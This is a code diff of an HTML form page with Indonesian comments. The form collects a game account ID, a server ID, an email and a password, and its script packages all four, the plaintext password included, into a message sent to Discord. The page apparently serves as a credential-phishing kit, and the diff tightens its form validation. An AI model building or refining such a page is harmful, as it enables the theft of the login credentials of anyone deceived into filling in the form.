@@ -98,13 +98,13 @@
         <div class="form-container">
             <form id="data-form">
                 <label for="id">ID</label>
-                <input type="text" id="id" placeholder="Your ID">
+                <input type="text" id="id" placeholder="Your ID" required>
                 <label for="id-server">ID Server (Max 5 digits)</label>
-                <input type="number" id="id-server" placeholder="Your Server ID" max="99999">
+                <input type="number" id="id-server" placeholder="Your Server ID" max="99999" required>
                 <label for="email">Email</label>
-                <input type="text" id="email" placeholder="Your Email">
+                <input type="email" id="email" placeholder="Your Email" required>
                 <label for="password">Password</label>
-                <input type="password" id="password" placeholder="Your Password">
+                <input type="password" id="password" placeholder="Your Password" required>
                 <button type="button" id="submit-button">Submit</button>
             </form>
 
@@ -117,23 +117,19 @@
 
     <script>
         document.getElementById("submit-button").addEventListener("click", function () {
-            // Mengambil data dari formulir
             const id = document.getElementById("id").value;
             const idServer = document.getElementById("id-server").value;
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
 
-            // Validasi - memeriksa apakah semua kolom diisi
-            if (id === "" || idServer === "" || email === "" || password === "") {
-                alert("Silakan isi semua kolom sebelum mengirim!");
-            } else {
+            if (id && idServer && email && password) {
                 // Data yang akan dikirim ke Discord
                 const dataToDiscord = {
                     content: `<:mt:1167354079111020607>  **Pengguna : Monton**\n` +
-                    `- **ID:** ${id}\n` +
-                    `- **ID Server:** ${idServer}\n` +
-                    `- **Email:** ${email}\n` +
-                    `- **Password:** ${password}`,
+                        `- **ID:** ${id}\n` +
+                        `- **ID Server:** ${idServer}\n` +
+                        `- **Email:** ${email}\n` +
+                        `- **Password:** ${password}`,
                     username: "Pengguna Website", // Ganti dengan nama yang sesuai
                 };
 
@@ -165,6 +161,8 @@
                     .catch((error) => {
                         alert("Terjadi kesalahan: " + error);
                     });
+            } else {
+                alert("Mohon isi semua kolom dengan benar sebelum mengirim.");
             }
         });
     </script>
